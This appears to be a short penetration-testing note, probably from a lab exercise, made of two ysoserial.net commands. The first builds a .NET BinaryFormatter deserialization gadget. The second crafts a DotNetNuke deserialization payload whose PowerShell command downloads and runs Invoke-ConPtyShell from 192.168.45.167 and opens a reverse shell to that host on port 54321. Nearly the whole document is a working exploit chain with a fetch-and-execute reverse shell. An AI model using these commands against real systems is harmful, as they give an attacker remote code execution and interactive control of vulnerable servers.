
```
wine ~/Inev/tools/ysoserial.net/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"  
```
  
```
wine ~/Inev/tools/ysoserial.net/ysoserial.exe -p DotNetNuke -m run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX(IWR http://192.168.45.167/ConPtyShell/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.167 54321"
```